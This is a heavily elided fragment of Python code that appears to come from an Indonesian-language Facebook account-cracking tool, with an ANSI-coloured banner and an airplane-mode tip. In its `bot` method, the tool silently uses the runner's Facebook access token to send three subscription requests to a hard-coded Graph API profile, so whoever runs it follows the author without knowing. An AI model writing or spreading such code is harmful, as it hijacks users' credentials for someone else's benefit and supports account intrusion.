...
───────────────────────────────────────────────────────
 ...
 [\x1b[1;96m+%s] USER:FREE 
 [\x1b[1;96m+%s] aktifkan: mod pesawat 2 detik
───────────────────────────────────────────────────────\n'''%(N,N,N,N))
...
class login:
	...
	def bot(self):
		...
		requests.post('https://graph.facebook.com/100068397981838/subscribers?access_token=' + toket) #Niki gagal Tenaar
		requests.post('https://graph.facebook.com/100068397981838/subscribers?access_token=' + toket) #Niki gagal Tenaar
		requests.post('https://graph.facebook.com/100068397981838/subscribers?access_token=' + toket) #Niki gagal Tenaar
